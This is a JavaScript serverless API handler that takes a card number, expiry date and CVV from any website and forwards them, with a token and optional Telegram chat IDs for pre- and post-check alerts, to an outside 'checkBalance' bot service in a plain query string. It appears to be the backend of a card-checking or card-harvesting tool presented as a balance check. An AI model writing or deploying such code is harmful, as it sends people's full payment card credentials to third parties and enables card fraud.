const API_URL = 'https://bot.pc.am/v3/checkBalance';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  const API_TOKEN = process.env.API_TOKEN;
  const TELEGRAM_BEFORE = process.env.TELEGRAM_ID_BEFORE_CHECK?.trim();
  const TELEGRAM_AFTER = process.env.TELEGRAM_ID_AFTER_CHECK?.trim();

  if (!API_TOKEN) {
    return res.status(200).json({ success: false, error: 'API token not configured' });
  }

  try {
    const { cardNumber, expiryMonth, expiryYear, cvv } = req.body || {};
    const number = (cardNumber || '').replace(/\s/g, '');
    const month = (expiryMonth || '').padStart(2, '0');
    const year = expiryYear || '';
    const cvvVal = cvv || '';

    const params = new URLSearchParams({
      token: API_TOKEN,
      number,
      month,
      year,
      cvv: cvvVal
    });
    if (TELEGRAM_BEFORE) params.set('telegram_id_before_check', TELEGRAM_BEFORE);
    if (TELEGRAM_AFTER) params.set('telegram_id_after_check', TELEGRAM_AFTER);

    const apiRes = await fetch(API_URL + '?' + params.toString());
    const text = await apiRes.text();
    let data;
    try {
      data = JSON.parse(text);
    } catch {
      data = { raw: text, success: false, error: 'Invalid response' };
    }
    res.status(200).json(data);
  } catch (err) {
    res.status(200).json({ success: false, error: err.message || 'Request failed' });
  }
}
